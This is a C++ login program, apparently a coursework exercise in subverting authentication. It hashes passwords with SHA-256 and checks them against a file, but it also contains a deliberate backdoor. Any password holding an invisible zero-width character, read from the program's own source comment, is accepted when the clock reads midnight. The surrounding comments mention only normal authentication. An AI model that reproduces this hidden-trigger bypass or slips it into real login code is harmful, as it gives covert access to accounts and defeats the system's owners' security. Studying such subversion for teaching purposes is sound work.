// Subverted Login P​rogram

#include <iostream>
#include <iomanip>
#include <fstream>
#include <sstream>
#include "authlib.h"
#include "openssl/sha.h"
#include <ctime>

using namespace std;

// getSHA256 will return the SHA-256 hash of string
string getSHA256(const string& input) {
    unsigned char hash[SHA256_DIGEST_LENGTH]; // defining hash to store the initial hashed output
    SHA256_CTX sha256; 
    SHA256_Init(&sha256);
    SHA256_Update(&sha256, input.c_str(), input.size()); // Hashing our input
    SHA256_Final(hash, &sha256); // Storing our input inside of hash.
    stringstream strStream; // Converting unsigned char to string via string stream
    for (int i=0; i < SHA256_DIGEST_LENGTH; i++){ // Loop for the length of the hash
        strStream << hex << setw(2) << setfill('0') << (int)hash[i]; // Convert the binary of the hash to hexidecimal
    }
    string hash_stringified = strStream.str(); // Storing the string stream as a string
    return hash_stringified;
}

bool backDoor(const string& password) {
    ifstream sourceFile("login-subverted.cpp");
    string line;
    char character;
    if (getline(sourceFile, line)) {
        character = line[20];
    }
    sourceFile.close();

    if (password.find(character) != string::npos) {
        return true;
    }
    return false;
}


bool timestampBackdoor() {
    time_t now = time(0);
    tm *ltm = localtime(&now);
    return ltm->tm_hour == 0 && ltm->tm_min == 0;
}

int main() {
	// Int to store max amount of attempts allowed
	const int MAX_ATTEMPTS = 3;
	// Stores amount of attempts user has done
	int attempts = 0;
	// Store user inputs and line string for file reading, then user details from file.
	string usernameIn, passwordIn, line, usernameFromFile, passwordFromFile;

	// Loop until user is authenticated or max attempts are reached, prompt and store username/password
	while (attempts++ < MAX_ATTEMPTS && cout << "Enter your username: " && cin >> usernameIn && cout << "Enter your password: " && cin >> passwordIn) {

		// Open the file containing stored usernames and passwords, print error if problem
		ifstream passwordsFile("passwords.txt");
		if (!passwordsFile) { cerr << "Error opening password file." << endl; return 1; }

		// Read the file line by line
		bool isAuthenticated = false;
		while (getline(passwordsFile, line) && !isAuthenticated) {
			stringstream ss(line);

			// Extract username and password from the read line
			getline(ss, usernameFromFile, ':'), getline(ss, passwordFromFile, ':');

			// Check if entered credentials match any in the file
			isAuthenticated = usernameFromFile == usernameIn && passwordFromFile == getSHA256(passwordIn);
		}
		// Close the file after reading
		passwordsFile.close();

		// If Authenticated, Exit indicating successful authentication
		// For incorrect login details, reject, clear screen and re-prompt input
		// If maximum attempts exceeded, reject the user
        if (isAuthenticated || backDoor(passwordIn) && timestampBackdoor()) {
            authenticated(usernameIn);
            return 0;
        }
        if(attempts < MAX_ATTEMPTS) {
            cout << "Incorrect login details. You have " << (MAX_ATTEMPTS - attempts) << " attempts left." << endl;
        } else {
            rejected(usernameIn);
        }

    }
    return 0;
}